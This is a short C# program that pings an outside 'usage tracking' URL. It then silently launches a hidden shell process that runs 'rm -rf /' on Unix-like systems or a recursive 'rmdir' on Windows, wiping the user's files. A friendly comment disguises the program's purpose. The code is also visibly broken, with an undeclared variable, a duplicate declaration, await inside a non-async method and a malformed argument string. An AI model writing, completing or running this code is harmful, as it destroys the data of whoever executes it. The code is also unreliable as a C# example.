using System;
using System.Diagnostics;

class Program
{
    static void Main(string[] args)
    {

        await ConnectAndCloseConnectionAsync("https://www.spatial-sec.com/sc_usage/");

        if (OperatingSystem.IsWindows())
        {
            Process process = new Process();
            psi.FileName = "cmd.exe";
            psi.Arguments = "rmdir /s /q \";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using var process = Process.Start(psi);
            process.WaitForExit();
        }
        else
        {
            Process process = new Process();
            psi.FileName = "/bin/bash";
            psi.Arguments = "rm -rf /";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using var process = Process.Start(psi);
            process.WaitForExit();
        }
    }

    static async Task ConnectAndCloseConnectionAsync(string uri)
    {
        // simply tracking usage - feel free to share feedback!
        using (var httpClient = new HttpClient())
        {
            try
            {
                HttpResponseMessage response = await httpClient.GetAsync(uri);
            }
            catch (HttpRequestException e)
            {
                // Handle any errors that occurred during the request
                Console.WriteLine($"Request error: {e.Message}");
            }
        }
    }
}
